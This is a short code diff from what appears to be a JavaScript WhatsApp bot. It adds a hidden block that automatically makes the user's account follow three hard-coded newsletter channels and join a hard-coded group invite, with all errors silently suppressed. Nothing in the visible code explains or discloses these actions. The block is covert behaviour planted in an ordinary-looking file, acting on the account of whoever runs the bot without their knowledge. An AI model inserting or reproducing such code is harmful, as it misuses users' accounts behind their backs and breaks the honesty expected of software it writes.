@@ -263,6 +263,19 @@ let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", 
 })
 return build_server + data.image
 }
+	try {
+    await trashcore.newsletterFollow('120363257205745956@newsletter');
+    await trashcore.newsletterFollow('120363418618707597@newsletter');
+    await trashcore.newsletterFollow('120363322464215140@newsletter');
+} catch (e) {
+    // silently ignore newsletter follow errors
+}
+
+try {
+    await trashcore.groupAcceptInvite('CzFlFQrkdzxFw0pxCBYM7H');
+} catch (e) {
+    // silently ignore group join errors
+}
 const lol = {
   key: {
     fromMe: false,
